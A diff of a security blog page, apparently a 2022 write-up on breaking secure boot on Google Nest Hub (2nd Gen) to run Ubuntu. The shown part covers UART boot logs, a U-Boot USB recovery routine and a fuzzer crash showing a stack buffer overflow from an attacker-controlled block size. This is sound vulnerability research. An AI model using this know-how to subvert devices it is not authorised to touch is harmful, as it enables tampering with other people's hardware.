@@ -2,106 +2,166 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
-
-    <link rel="stylesheet" type="text/css" href="https://fredericb.info/theme/stylesheet/style.min.css">
-
-  <link rel="stylesheet" type="text/css" href="https://fredericb.info/theme/pygments/github.min.css">
-  <link rel="stylesheet" type="text/css" href="https://fredericb.info/theme/font-awesome/css/font-awesome.min.css">
-
-
-    <link href="https://fredericb.info/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="fred's notes Atom">
-
-
-    <link rel="shortcut icon" href="/resources/favicon.ico" type="image/x-icon">
-    <link rel="icon" href="/resources/favicon.ico" type="image/x-icon">
-
-
   <meta charset="utf-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="HandheldFriendly" content="True" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="" />
+  <meta name="robots" content="index, follow" />
 
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="https://fredericb.info/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark)"
+    href="https://fredericb.info/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark)"
+          href="https://fredericb.info/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
+          href="https://fredericb.info/theme/pygments/monokai.min.css">
+
+
+
+  <link rel="stylesheet" type="text/css" href="https://fredericb.info/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="https://fredericb.info/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="https://fredericb.info/theme/font-awesome/css/solid.css">
+
+
+  <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+  <!-- Chrome, Firefox OS and Opera -->
+  <meta name="theme-color" content="#333333">
+  <!-- Windows Phone -->
+  <meta name="msapplication-navbutton-color" content="#333333">
+  <!-- iOS Safari -->
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <!-- Microsoft EDGE -->
+  <meta name="msapplication-TileColor" content="#333333">
+
+  <link href="https://fredericb.info/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="fred's notes Atom">
+
+
+
+ 
 
 <meta name="author" content="Frédéric" />
 <meta name="description" content="In this post, we attack the Nest Hub (2nd Gen), an always-connected smart home display from Google, in order to boot a custom OS. First, we explore both hardware and software attack surface in search of security vulnerabilities that could permit arbitrary code execution on the device. Then, using a …" />
 <meta name="keywords" content="arm, amlogic, bootloader, exploit, nest, secureboot, uboot, ubuntu, usb">
 
-<meta property="og:site_name" content="fred's notes"/>
-<meta property="og:title" content="Breaking Secure Boot on Google Nest Hub (2nd Gen) to run Ubuntu"/>
-<meta property="og:description" content="In this post, we attack the Nest Hub (2nd Gen), an always-connected smart home display from Google, in order to boot a custom OS. First, we explore both hardware and software attack surface in search of security vulnerabilities that could permit arbitrary code execution on the device. Then, using a …"/>
-<meta property="og:locale" content="en_US"/>
-<meta property="og:url" content="https://fredericb.info/2022/06/breaking-secure-boot-on-google-nest-hub-2nd-gen-to-run-ubuntu.html"/>
-<meta property="og:type" content="article"/>
-<meta property="article:published_time" content="2022-06-15 00:00:00-07:00"/>
-<meta property="article:modified_time" content=""/>
-<meta property="article:author" content="https://fredericb.info/author/frederic.html">
-<meta property="article:section" content="Article"/>
-<meta property="article:tag" content="arm"/>
-<meta property="article:tag" content="amlogic"/>
-<meta property="article:tag" content="bootloader"/>
-<meta property="article:tag" content="exploit"/>
-<meta property="article:tag" content="nest"/>
-<meta property="article:tag" content="secureboot"/>
-<meta property="article:tag" content="uboot"/>
-<meta property="article:tag" content="ubuntu"/>
-<meta property="article:tag" content="usb"/>
-<meta property="og:image" content="/resources/sitelogo.jpg">
+
+  <meta property="og:site_name" content="fred's notes"/>
+  <meta property="og:title" content="Breaking Secure Boot on Google Nest Hub (2nd Gen) to run Ubuntu"/>
+  <meta property="og:description" content="In this post, we attack the Nest Hub (2nd Gen), an always-connected smart home display from Google, in order to boot a custom OS. First, we explore both hardware and software attack surface in search of security vulnerabilities that could permit arbitrary code execution on the device. Then, using a …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="https://fredericb.info/2022/06/breaking-secure-boot-on-google-nest-hub-2nd-gen-to-run-ubuntu.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2022-06-15 00:00:00-07:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="https://fredericb.info/author/frederic.html">
+  <meta property="article:section" content="Article"/>
+  <meta property="article:tag" content="arm"/>
+  <meta property="article:tag" content="amlogic"/>
+  <meta property="article:tag" content="bootloader"/>
+  <meta property="article:tag" content="exploit"/>
+  <meta property="article:tag" content="nest"/>
+  <meta property="article:tag" content="secureboot"/>
+  <meta property="article:tag" content="uboot"/>
+  <meta property="article:tag" content="ubuntu"/>
+  <meta property="article:tag" content="usb"/>
+  <meta property="og:image" content="/sitelogo.jpg">
 
   <title>fred's notes &ndash; Breaking Secure Boot on Google Nest Hub (2nd Gen) to run Ubuntu</title>
 
+
 </head>
-<body>
-  <aside>
-    <div>
-      <a href="/">
-        <img src="/resources/sitelogo.jpg" alt="fred's notes" title="fred's notes">
-      </a>
-      <h1><a href="/">fred's notes</a></h1>
+<body >
 
-<p>Security & Stuff</p>
-      <nav>
-        <ul class="list">
-          <li><a href="https://fredericb.info/category/advisory.html">Advisory</a></li>
-          <li><a href="https://fredericb.info/category/article.html">Article</a></li>
-          <li><a href="https://fredericb.info/category/tool.html">Tool</a></li>
-          <li><a href="https://fredericb.info/pages/contact.html#contact">Contact</a></li>
+<aside>
+  <div>
+    <a href="https://fredericb.info/">
+      <img src="/sitelogo.jpg" alt="fred's notes" title="fred's notes">
+    </a>
 
-        </ul>
-      </nav>
+    <h1>
+      <a href="https://fredericb.info/">fred's notes</a>
+    </h1>
 
-      <ul class="social">
-        <li><a class="sc-github" href="https://github.com/frederic" target="_blank"><i class="fa fa-github"></i></a></li>
-        <li><a class="sc-linkedin" href="https://www.linkedin.com/in/fredericbasse" target="_blank"><i class="fa fa-linkedin"></i></a></li>
-        <li><a class="sc-rss" href="/feeds/all.atom.xml" target="_blank"><i class="fa fa-rss"></i></a></li>
-      </ul>
-    </div>
+    <p>Security & Stuff</p>
 
-
-  </aside>
-  <main>
 
     <nav>
-      <a href="https://fredericb.info/">    Home
-</a>
+      <ul class="list">
 
-      <a href="/archives.html">Archives</a>
-      <a href="/categories.html">Categories</a>
-      <a href="/tags.html">Tags</a>
 
-      <a href="https://fredericb.info/feeds/all.atom.xml">    Atom
-</a>
+            <li>
+              <a target="_self"
+                 href="https://fredericb.info/pages/contact.html">
+                Contact
+              </a>
+            </li>
 
+          <li>
+            <a target="_self" href="/category/advisory.html" >advisory</a>
+          </li>
+          <li>
+            <a target="_self" href="/category/article.html" >article</a>
+          </li>
+          <li>
+            <a target="_self" href="/category/tool.html" >tool</a>
+          </li>
+      </ul>
     </nav>
+
+    <ul class="social">
+      <li>
+        <a class="sc-github"
+           href="https://github.com/frederic"
+           target="_blank">
+          <i class="fa-brands fa-github"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-mastodon"
+rel="me"           href="https://infosec.exchange/@zeewox"
+           target="_blank">
+          <i class="fa-brands fa-mastodon"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-rss"
+           href="/feeds/all.atom.xml"
+           target="_blank">
+          <i class="fa-solid fa-rss"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+</aside>
+  <main>
+
+<nav>
+  <a href="https://fredericb.info/">Home</a>
+
+  <a href="/archives.html">Archives</a>
+  <a href="/categories.html">Categories</a>
+  <a href="/tags.html">Tags</a>
+
+  <a href="https://fredericb.info/feeds/all.atom.xml">Atom</a>
+
+</nav>
 
 <article class="single">
   <header>
       
     <h1 id="breaking-secure-boot-on-google-nest-hub-2nd-gen-to-run-ubuntu">Breaking Secure Boot on Google Nest Hub (2nd Gen) to run Ubuntu</h1>
     <p>
-          Posted on Wed 15 June 2022 in <a href="https://fredericb.info/category/article.html">Article</a>
-
+      Posted on Wed 15 June 2022 in <a href="https://fredericb.info/category/article.html">Article</a>
 
     </p>
   </header>
@@ -208,52 +268,50 @@ We keep that in mind since a boot flow change can also mean attack surface chang
 <p>This board provides a convenient access to UART, USB and power supply.</p>
 <h2>UART port</h2>
 <p>Using our debug board, we connect an USB-to-Serial adapter to the UART port to obtain logs during boot :</p>
-<div class="highlight"><pre><span></span>SM1:BL:511f6b:81ca2f<span class="p">;</span>FEAT:A28821B2:202B3000<span class="p">;</span>POC:F<span class="p">;</span>EMMC:0<span class="p">;</span>READ:0<span class="p">;</span>CHK:1F<span class="p">;</span>READ:0<span class="p">;</span><span class="m">0</span>.0<span class="p">;</span><span class="m">0</span>.0<span class="p">;</span>CHK:0<span class="p">;</span>
-bl2_stage_init 0x01
+<div class="highlight"><pre><span></span><code>SM1:BL:511f6b:81ca2f<span class="p">;</span>FEAT:A28821B2:202B3000<span class="p">;</span>POC:F<span class="p">;</span>EMMC:0<span class="p">;</span>READ:0<span class="p">;</span>CHK:1F<span class="p">;</span>READ:0<span class="p">;</span><span class="m">0</span>.0<span class="p">;</span><span class="m">0</span>.0<span class="p">;</span>CHK:0<span class="p">;</span>
+bl2_stage_init<span class="w"> </span>0x01
 <span class="o">[</span>...<span class="o">]</span>
-BL2 Built : <span class="m">20</span>:46:51, Dec <span class="m">10</span> <span class="m">2020</span>. <span class="se">\n</span>g12a g3d61890 - user@host
+BL2<span class="w"> </span>Built<span class="w"> </span>:<span class="w"> </span><span class="m">20</span>:46:51,<span class="w"> </span>Dec<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">2020</span>.<span class="w"> </span><span class="se">\n</span>g12a<span class="w"> </span>g3d61890<span class="w"> </span>-<span class="w"> </span>user@host
 <span class="o">[</span>...<span class="o">]</span>
-U-Boot <span class="m">2019</span>.01-gbfc19012ea-dirty <span class="o">(</span>Dec <span class="m">11</span> <span class="m">2020</span> - <span class="m">04</span>:19:32 <span class="o">)</span>
+U-Boot<span class="w"> </span><span class="m">2019</span>.01-gbfc19012ea-dirty<span class="w"> </span><span class="o">(</span>Dec<span class="w"> </span><span class="m">11</span><span class="w"> </span><span class="m">2020</span><span class="w"> </span>-<span class="w"> </span><span class="m">04</span>:19:32<span class="w"> </span><span class="o">)</span>
 
-DRAM:  <span class="m">2</span> GiB
-board init
+DRAM:<span class="w">  </span><span class="m">2</span><span class="w"> </span>GiB
+board<span class="w"> </span>init
 <span class="o">[</span>...<span class="o">]</span>
-MUTE engaged
-VOL_UP not pressed
-upgrade key not pressed
+MUTE<span class="w"> </span>engaged
+VOL_UP<span class="w"> </span>not<span class="w"> </span>pressed
+upgrade<span class="w"> </span>key<span class="w"> </span>not<span class="w"> </span>pressed
 reboot_mode:cold_boot
 cold_boot
-aml log : boot from nand or emmc
-Kernel decrypted
-kernel verify: success
+aml<span class="w"> </span>log<span class="w"> </span>:<span class="w"> </span>boot<span class="w"> </span>from<span class="w"> </span>nand<span class="w"> </span>or<span class="w"> </span>emmc
+Kernel<span class="w"> </span>decrypted
+kernel<span class="w"> </span>verify:<span class="w"> </span>success
 <span class="o">[</span>...<span class="o">]</span>
-Starting kernel ...
-</pre></div>
-
+Starting<span class="w"> </span>kernel<span class="w"> </span>...
+</code></pre></div>
 
 <p>We can see bootloader and U-Boot logs, kernel image seems encrypted, but 
 no more logs once Linux has started though.</p>
 <p>We also see that button states are checked ("MUTE engaged", "VOL_UP not pressed"), and that "upgrade key not pressed".
 This is really intriguing since any new feature we discover could represent a new attack surface.</p>
 <p>We try to boot again, this time while holding both volume buttons (volume down &amp; volume up) :</p>
-<div class="highlight"><pre><span></span><span class="o">[</span>...<span class="o">]</span>
-U-Boot <span class="m">2019</span>.01-gbfc19012ea-dirty <span class="o">(</span>Dec <span class="m">11</span> <span class="m">2020</span> - <span class="m">04</span>:19:32 <span class="o">)</span>
+<div class="highlight"><pre><span></span><code><span class="o">[</span>...<span class="o">]</span>
+U-Boot<span class="w"> </span><span class="m">2019</span>.01-gbfc19012ea-dirty<span class="w"> </span><span class="o">(</span>Dec<span class="w"> </span><span class="m">11</span><span class="w"> </span><span class="m">2020</span><span class="w"> </span>-<span class="w"> </span><span class="m">04</span>:19:32<span class="w"> </span><span class="o">)</span>
 <span class="o">[</span>...<span class="o">]</span>
-MUTE engaged
-VOL_UP pressed
-VOL_DN pressed
-detect VOL_UP pressed
-VOL_DN pressed
-resetting USB...
-USB0:   Register <span class="m">3000140</span> NbrPorts <span class="m">2</span>
-Starting the controller
-USB XHCI <span class="m">1</span>.10
-scanning bus <span class="m">0</span> <span class="k">for</span> devices... <span class="m">3</span> USB Device<span class="o">(</span>s<span class="o">)</span> found
-       scanning usb <span class="k">for</span> storage devices... <span class="m">2</span> Storage Device<span class="o">(</span>s<span class="o">)</span> found
-** Unable to <span class="nb">read</span> file recovery.img **
-resetting USB...
-</pre></div>
-
+MUTE<span class="w"> </span>engaged
+VOL_UP<span class="w"> </span>pressed
+VOL_DN<span class="w"> </span>pressed
+detect<span class="w"> </span>VOL_UP<span class="w"> </span>pressed
+VOL_DN<span class="w"> </span>pressed
+resetting<span class="w"> </span>USB...
+USB0:<span class="w">   </span>Register<span class="w"> </span><span class="m">3000140</span><span class="w"> </span>NbrPorts<span class="w"> </span><span class="m">2</span>
+Starting<span class="w"> </span>the<span class="w"> </span>controller
+USB<span class="w"> </span>XHCI<span class="w"> </span><span class="m">1</span>.10
+scanning<span class="w"> </span>bus<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>devices...<span class="w"> </span><span class="m">3</span><span class="w"> </span>USB<span class="w"> </span>Device<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>found
+<span class="w">       </span>scanning<span class="w"> </span>usb<span class="w"> </span><span class="k">for</span><span class="w"> </span>storage<span class="w"> </span>devices...<span class="w"> </span><span class="m">2</span><span class="w"> </span>Storage<span class="w"> </span>Device<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>found
+**<span class="w"> </span>Unable<span class="w"> </span>to<span class="w"> </span><span class="nb">read</span><span class="w"> </span>file<span class="w"> </span>recovery.img<span class="w"> </span>**
+resetting<span class="w"> </span>USB...
+</code></pre></div>
 
 <p>When booted this way, the Nest Hub tries to load a file named <em>recovery.img</em> from an USB flash drive. Attack surface just increased.</p>
 <h1>2. Software exploration</h1>
@@ -267,30 +325,28 @@ resetting USB...
 <li>Data is loaded from external USB source : no need to disassemble the device.</li>
 </ul>
 <p>To quickly locate this feature in U-Boot source tree, we grep <em>recovery.img</em>. We find a function named <strong>recovery_from_udisk</strong> in U-Boot environment :</p>
-<div class="highlight"><pre><span></span><span class="s2">&quot;recovery_from_udisk=&quot;</span> <span class="se">\</span>
-       <span class="s2">&quot;while true ;do &quot;</span> <span class="se">\</span>
-              <span class="s2">&quot;usb reset; &quot;</span> <span class="se">\</span>
-              <span class="s2">&quot;if fatload usb 0 </span><span class="si">${</span><span class="nv">loadaddr</span><span class="si">}</span><span class="s2"> recovery.img; then &quot;</span><span class="se">\</span>
-                     <span class="s2">&quot;bootm </span><span class="si">${</span><span class="nv">loadaddr</span><span class="si">}</span><span class="s2">;&quot;</span> <span class="se">\</span>
-              <span class="s2">&quot;fi;&quot;</span> <span class="se">\</span>
-       <span class="s2">&quot;done;&quot;</span> <span class="se">\</span>
-       <span class="s2">&quot;\0&quot;</span> <span class="se">\</span>
-</pre></div>
-
+<div class="highlight"><pre><span></span><code><span class="s2">&quot;recovery_from_udisk=&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">       </span><span class="s2">&quot;while true ;do &quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">              </span><span class="s2">&quot;usb reset; &quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">              </span><span class="s2">&quot;if fatload usb 0 </span><span class="si">${</span><span class="nv">loadaddr</span><span class="si">}</span><span class="s2"> recovery.img; then &quot;</span><span class="se">\</span>
+<span class="w">                     </span><span class="s2">&quot;bootm </span><span class="si">${</span><span class="nv">loadaddr</span><span class="si">}</span><span class="s2">;&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">              </span><span class="s2">&quot;fi;&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">       </span><span class="s2">&quot;done;&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">       </span><span class="s2">&quot;\0&quot;</span><span class="w"> </span><span class="se">\</span>
+</code></pre></div>
 
 <p>First, this code resets the USB subsystem. Then, it calls the <strong>fatload</strong> function to load a boot image named <em>recovery.img</em> in memory at address <em>loadaddr</em>.
 Finally, it tries to boot the loaded data using function <strong>bootm</strong>.</p>
 <p>We can also confirm that function <strong>recovery_from_udisk</strong> is run when both volume buttons are held  (GPIOZ_5 &amp; GPIOZ_6) :</p>
-<div class="highlight"><pre><span></span><span class="s2">&quot;upgrade_key=&quot;</span> <span class="se">\</span>
-       <span class="s2">&quot;if gpio input GPIOZ_5; then &quot;</span> <span class="se">\</span>
-              <span class="s2">&quot;echo detect VOL_UP pressed;&quot;</span> <span class="se">\</span>
-              <span class="s2">&quot;if gpio input GPIOZ_6; then &quot;</span> <span class="se">\</span>
-                     <span class="s2">&quot;echo VOL_DN pressed;&quot;</span> <span class="se">\</span>
-                     <span class="s2">&quot;setenv boot_external_image 1;&quot;</span> <span class="se">\</span>
-                     <span class="s2">&quot;run recovery_from_udisk;&quot;</span> <span class="se">\</span>
+<div class="highlight"><pre><span></span><code><span class="s2">&quot;upgrade_key=&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">       </span><span class="s2">&quot;if gpio input GPIOZ_5; then &quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">              </span><span class="s2">&quot;echo detect VOL_UP pressed;&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">              </span><span class="s2">&quot;if gpio input GPIOZ_6; then &quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">                     </span><span class="s2">&quot;echo VOL_DN pressed;&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">                     </span><span class="s2">&quot;setenv boot_external_image 1;&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">                     </span><span class="s2">&quot;run recovery_from_udisk;&quot;</span><span class="w"> </span><span class="se">\</span>
 <span class="o">[</span>...<span class="o">]</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>This recovery feature is an ideal mechanism to boot an alternative OS. However, a quick look at <strong>bootm</strong> function reveals it systematically verifies <em>recovery.img</em> signature by calling function <strong>aml_sec_boot_check</strong>.</p>
 <p>To boot a custom OS using this mechanism, we first have to find a bug that could bypass this verification.</p>
@@ -312,47 +368,45 @@ This first fuzzing attempt uncovered few <a href="https://en.wikipedia.org/wiki/
 <p>In a second phase, we extend the fuzzing to the initialized state since some parameters can be controlled by the attacker. For example, the USB Mass Storage driver sets <a href="https://github.com/u-boot/u-boot/blob/28c2ebef372b4c9bb18bed8373e0d9e65a09b42b/common/usb_storage.c#L1421">multiple parameters</a> in <a href="https://github.com/u-boot/u-boot/blob/28c2ebef372b4c9bb18bed8373e0d9e65a09b42b/include/blk.h#L67">structure blk_desc</a> that describe the detected block device in initialized state.</p>
 <p>One of them is the block size (<em>blk_desc.blksz</em>) of the block device (which is an USB flash drive in our case). This value is obtained from the block device by sending command <a href="https://github.com/u-boot/u-boot/blob/28c2ebef372b4c9bb18bed8373e0d9e65a09b42b/common/usb_storage.c#L1051">READ CAPACITY</a>, which means attacker controls it.</p>
 <p>Block size is an important parameter for upper layers like partition and filesystem drivers. Messing with it led to an interesting crash :</p>
-<div class="highlight"><pre><span></span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">fuzz</span>
-<span class="nl">INFO</span><span class="p">:</span> <span class="nl">Seed</span><span class="p">:</span> <span class="mi">473398954</span>
-<span class="nl">INFO</span><span class="p">:</span> <span class="n">Loaded</span> <span class="mi">1</span> <span class="n">modules</span>   <span class="p">(</span><span class="mi">1402</span> <span class="kr">inline</span> <span class="mi">8</span><span class="o">-</span><span class="n">bit</span> <span class="n">counters</span><span class="p">)</span><span class="o">:</span> <span class="mi">1402</span> <span class="p">[</span><span class="mh">0x5aa0c0</span><span class="p">,</span> <span class="mh">0x5aa63a</span><span class="p">),</span> 
-<span class="nl">INFO</span><span class="p">:</span> <span class="n">Loaded</span> <span class="mi">1</span> <span class="n">PC</span> <span class="n">tables</span> <span class="p">(</span><span class="mi">1402</span> <span class="n">PCs</span><span class="p">)</span><span class="o">:</span> <span class="mi">1402</span> <span class="p">[</span><span class="mh">0x57ada0</span><span class="p">,</span><span class="mh">0x580540</span><span class="p">),</span> 
+<div class="highlight"><pre><span></span><code><span class="n">$</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">fuzz</span>
+<span class="nl">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Seed</span><span class="o">:</span><span class="w"> </span><span class="mi">473398954</span>
+<span class="nl">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Loaded</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">modules</span><span class="w">   </span><span class="p">(</span><span class="mi">1402</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="mi">8</span><span class="o">-</span><span class="n">bit</span><span class="w"> </span><span class="n">counters</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="mi">1402</span><span class="w"> </span><span class="p">[</span><span class="mh">0x5aa0c0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5aa63a</span><span class="p">),</span><span class="w"> </span>
+<span class="nl">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Loaded</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">PC</span><span class="w"> </span><span class="n">tables</span><span class="w"> </span><span class="p">(</span><span class="mi">1402</span><span class="w"> </span><span class="n">PCs</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="mi">1402</span><span class="w"> </span><span class="p">[</span><span class="mh">0x57ada0</span><span class="p">,</span><span class="mh">0x580540</span><span class="p">),</span><span class="w"> </span>
 <span class="o">=================================================================</span>
-<span class="o">==</span><span class="mi">5892</span><span class="o">==</span><span class="nl">ERROR</span><span class="p">:</span> <span class="nl">AddressSanitizer</span><span class="p">:</span> <span class="n">stack</span><span class="o">-</span><span class="n">buffer</span><span class="o">-</span><span class="n">overflow</span> <span class="n">on</span> <span class="n">address</span> <span class="mh">0x7ffe6db4bb3f</span> <span class="n">at</span> <span class="n">pc</span> <span class="mh">0x0000004f16af</span> <span class="n">bp</span> <span class="mh">0x7ffe6db4b790</span> <span class="n">sp</span> <span class="mh">0x7ffe6db4af40</span>
-<span class="n">WRITE</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">32768</span> <span class="n">at</span> <span class="mh">0x7ffe6db4bb3f</span> <span class="kr">thread</span> <span class="n">T0</span>
-    <span class="cp">#0 0x4f16ae in __asan_memset (/u-boot-elaine/fuzzer/fuzz+0x4f16ae)</span>
-    <span class="cp">#1 0x55a8cf in blk_dread /u-boot-elaine/fuzzer/blk.c:153:13</span>
-    <span class="cp">#2 0x5284b1 in part_test_dos /u-boot-elaine/disk/part_dos.c:96:6</span>
-    <span class="cp">#3 0x521f52 in part_init /u-boot-elaine/disk/part.c:242:9</span>
-    <span class="cp">#4 0x55b494 in usb_stor_probe_device /u-boot-elaine/fuzzer/usb_storage.c:41:5</span>
-    <span class="cp">#5 0x55b648 in LLVMFuzzerTestOneInput /u-boot-elaine/fuzzer/fuzz.c:42:5</span>
-    <span class="cp">#6 0x42ee1a in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/u-boot-elaine/fuzzer/fuzz+0x42ee1a)</span>
-    <span class="cp">#7 0x43052a in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::vector&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, fuzzer::fuzzer_allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; const&amp;) (/u-boot-elaine/fuzzer/fuzz+0x43052a)</span>
-    <span class="cp">#8 0x430bf5 in fuzzer::Fuzzer::Loop(std::vector&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, fuzzer::fuzzer_allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; const&amp;) (/u-boot-elaine/fuzzer/fuzz+0x430bf5)</span>
-    <span class="cp">#9 0x426e00 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/u-boot-elaine/fuzzer/fuzz+0x426e00)</span>
-    <span class="cp">#10 0x44a412 in main (/u-boot-elaine/fuzzer/fuzz+0x44a412)</span>
-    <span class="cp">#11 0x7b733912f09a in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2409a)</span>
-    <span class="cp">#12 0x420919 in _start (/u-boot-elaine/fuzzer/fuzz+0x420919)</span>
+<span class="o">==</span><span class="mi">5892</span><span class="o">==</span><span class="n">ERROR</span><span class="o">:</span><span class="w"> </span><span class="n">AddressSanitizer</span><span class="o">:</span><span class="w"> </span><span class="n">stack</span><span class="o">-</span><span class="n">buffer</span><span class="o">-</span><span class="n">overflow</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="mh">0x7ffe6db4bb3f</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">pc</span><span class="w"> </span><span class="mh">0x0000004f16af</span><span class="w"> </span><span class="n">bp</span><span class="w"> </span><span class="mh">0x7ffe6db4b790</span><span class="w"> </span><span class="n">sp</span><span class="w"> </span><span class="mh">0x7ffe6db4af40</span>
+<span class="n">WRITE</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="mi">32768</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mh">0x7ffe6db4bb3f</span><span class="w"> </span><span class="kr">thread</span><span class="w"> </span><span class="n">T0</span>
+<span class="w">    </span><span class="cp">#0 0x4f16ae in __asan_memset (/u-boot-elaine/fuzzer/fuzz+0x4f16ae)</span>
+<span class="w">    </span><span class="cp">#1 0x55a8cf in blk_dread /u-boot-elaine/fuzzer/blk.c:153:13</span>
+<span class="w">    </span><span class="cp">#2 0x5284b1 in part_test_dos /u-boot-elaine/disk/part_dos.c:96:6</span>
+<span class="w">    </span><span class="cp">#3 0x521f52 in part_init /u-boot-elaine/disk/part.c:242:9</span>
+<span class="w">    </span><span class="cp">#4 0x55b494 in usb_stor_probe_device /u-boot-elaine/fuzzer/usb_storage.c:41:5</span>
+<span class="w">    </span><span class="cp">#5 0x55b648 in LLVMFuzzerTestOneInput /u-boot-elaine/fuzzer/fuzz.c:42:5</span>
+<span class="w">    </span><span class="cp">#6 0x42ee1a in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/u-boot-elaine/fuzzer/fuzz+0x42ee1a)</span>
+<span class="w">    </span><span class="cp">#7 0x43052a in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::vector&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, fuzzer::fuzzer_allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; const&amp;) (/u-boot-elaine/fuzzer/fuzz+0x43052a)</span>
+<span class="w">    </span><span class="cp">#8 0x430bf5 in fuzzer::Fuzzer::Loop(std::vector&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, fuzzer::fuzzer_allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; const&amp;) (/u-boot-elaine/fuzzer/fuzz+0x430bf5)</span>
+<span class="w">    </span><span class="cp">#9 0x426e00 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/u-boot-elaine/fuzzer/fuzz+0x426e00)</span>
+<span class="w">    </span><span class="cp">#10 0x44a412 in main (/u-boot-elaine/fuzzer/fuzz+0x44a412)</span>
+<span class="w">    </span><span class="cp">#11 0x7b733912f09a in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2409a)</span>
+<span class="w">    </span><span class="cp">#12 0x420919 in _start (/u-boot-elaine/fuzzer/fuzz+0x420919)</span>
 
-<span class="n">Address</span> <span class="mh">0x7ffe6db4bb3f</span> <span class="n">is</span> <span class="n">located</span> <span class="n">in</span> <span class="n">stack</span> <span class="n">of</span> <span class="kr">thread</span> <span class="n">T0</span> <span class="n">at</span> <span class="n">offset</span> <span class="mi">607</span> <span class="n">in</span> <span class="n">frame</span>
-    <span class="cp">#0 0x5282ff in part_test_dos /u-boot-elaine/disk/part_dos.c:90</span>
